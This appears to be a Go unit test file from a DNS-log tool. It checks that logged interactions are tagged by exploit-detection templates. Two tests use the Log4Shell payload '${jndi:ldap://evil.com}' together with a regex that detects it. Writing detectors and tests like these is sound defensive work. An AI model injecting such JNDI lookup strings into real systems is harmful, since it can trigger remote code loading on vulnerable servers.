package interaction

import (
	"testing"

	"github.com/chennqqi/godnslog/internal/marketplace/executor"
	"github.com/chennqqi/godnslog/internal/models"
	"github.com/stretchr/testify/assert"
)

// TestMatchTemplateInteraction_NilEngine verifies no panic when engine is nil.
func TestMatchTemplateInteraction_NilEngine(t *testing.T) {
	domain := "test.example.com"
	inter := &models.Interaction{Type: "dns", Domain: &domain}
	matchTemplateInteraction(inter, nil)
	assert.Nil(t, inter.ExploitType)
	assert.Nil(t, inter.Confidence)
}

// TestMatchTemplateInteraction_NilInteraction verifies no panic when interaction is nil.
func TestMatchTemplateInteraction_NilInteraction(t *testing.T) {
	engine := executor.NewEngine([]executor.TemplateDef{
		{Name: "test", Match: executor.MatchRule{Type: "contains", Field: "domain", Pattern: "test"}},
	})
	matchTemplateInteraction(nil, engine)
}

// TestMatchTemplateInteraction_MatchSetsExploitType verifies template match sets exploit_type.
func TestMatchTemplateInteraction_MatchSetsExploitType(t *testing.T) {
	engine := executor.NewEngine([]executor.TemplateDef{
		{
			Name:     "log4shell",
			Match:    executor.MatchRule{Type: "regex", Field: "domain", Pattern: `\$\{jndi:`},
			Severity: "critical",
		},
	})
	domain := "${jndi:ldap://evil.com}"
	inter := &models.Interaction{Type: "dns", Domain: &domain}

	matchTemplateInteraction(inter, engine)
	assert.NotNil(t, inter.ExploitType)
	assert.Equal(t, "log4shell", *inter.ExploitType)
	assert.NotNil(t, inter.Confidence)
	assert.Equal(t, "critical", *inter.Confidence)
}

// TestMatchTemplateInteraction_NoMatchKeepsFieldsNil verifies no match leaves fields unchanged.
func TestMatchTemplateInteraction_NoMatchKeepsFieldsNil(t *testing.T) {
	engine := executor.NewEngine([]executor.TemplateDef{
		{
			Name:     "log4shell",
			Match:    executor.MatchRule{Type: "regex", Field: "domain", Pattern: `\$\{jndi:`},
			Severity: "critical",
		},
	})
	domain := "normal.example.com"
	inter := &models.Interaction{Type: "dns", Domain: &domain}

	matchTemplateInteraction(inter, engine)
	assert.Nil(t, inter.ExploitType)
	assert.Nil(t, inter.Confidence)
}

// TestMatchTemplateInteraction_PreservesExistingExploitType verifies template match does not overwrite existing classification.
func TestMatchTemplateInteraction_PreservesExistingExploitType(t *testing.T) {
	engine := executor.NewEngine([]executor.TemplateDef{
		{
			Name:     "log4shell",
			Match:    executor.MatchRule{Type: "regex", Field: "domain", Pattern: `\$\{jndi:`},
			Severity: "critical",
		},
	})
	existingType := "custom-classification"
	existingConfidence := "high"
	domain := "${jndi:ldap://evil.com}"
	inter := &models.Interaction{
		Type:       "dns",
		Domain:     &domain,
		ExploitType: &existingType,
		Confidence:  &existingConfidence,
	}

	matchTemplateInteraction(inter, engine)
	assert.Equal(t, "custom-classification", *inter.ExploitType)
	assert.Equal(t, "high", *inter.Confidence)
}

// TestSetTemplateEngine verifies setting template engine on service.
func TestSetTemplateEngine(t *testing.T) {
	s := NewService(nil, nil, nil, false)
	assert.Nil(t, s.templateEngine)

	engine := executor.NewEngine(nil)
	s.SetTemplateEngine(engine)
	assert.NotNil(t, s.templateEngine)
}
